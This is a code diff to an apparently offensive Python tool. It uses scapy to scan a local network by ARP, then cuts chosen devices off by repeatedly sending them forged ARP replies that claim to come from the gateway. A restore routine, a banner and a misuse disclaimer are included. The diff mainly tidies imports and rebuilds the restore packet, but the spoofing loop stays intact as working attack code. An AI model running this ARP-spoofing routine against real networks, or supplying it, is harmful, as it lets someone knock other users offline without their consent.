@@ -1,9 +1,6 @@
 import os
 import time
 import csv
-import socket
-import fcntl
-import struct
 from scapy.all import ARP, Ether, srp, send, conf
 
 WHITELIST = set()
@@ -19,7 +16,6 @@ The author is not responsible for any misuse of this tool.
 """
 
 def get_network_range():
-    iface = conf.iface
     ip = conf.route.route("0.0.0.0")[1]
     return ip.rsplit('.', 1)[0] + ".1/24"
 
@@ -29,7 +25,7 @@ def get_gateway_info():
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether / arp_req
     result = srp(packet, timeout=2, verbose=0)[0]
-    for sent, received in result:
+    for _, received in result:
         return gw_ip, received.hwsrc
     return gw_ip, None
 
@@ -40,28 +36,30 @@ def scan_network():
     packet = ether / arp
     result = srp(packet, timeout=2, verbose=0)[0]
     devices = []
-    for sent, received in result:
+    for _, received in result:
         devices.append({'ip': received.psrc, 'mac': received.hwsrc})
     return devices
 
 def disconnect_device(ip, mac):
     print(f"[!] Disconnecting {ip} ({mac})")
     DISCONNECTED_DEVICES.add(ip)
-    
+
     def loop():
         while ip in DISCONNECTED_DEVICES:
+            arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
             ether = Ether(dst=mac)
-            packet = ether / ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP)
+            packet = ether / arp
             send(packet, verbose=0)
             time.sleep(2)
-    
+
     from threading import Thread
     Thread(target=loop, daemon=True).start()
 
-
 def restore_device(ip, mac):
     print(f"[+] Restoring {ip} ({mac})")
-    packet = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
+    arp = ARP(op=2, pdst=ip, hwdst=mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
+    ether = Ether(dst=mac)
+    packet = ether / arp
     send(packet, count=5, verbose=0)
     DISCONNECTED_DEVICES.discard(ip)
 
@@ -81,7 +79,7 @@ def main():
         exit()
 
     print("\n============================")
-    print(r"""        
+    print(r"""
 ░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
@@ -169,5 +167,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-
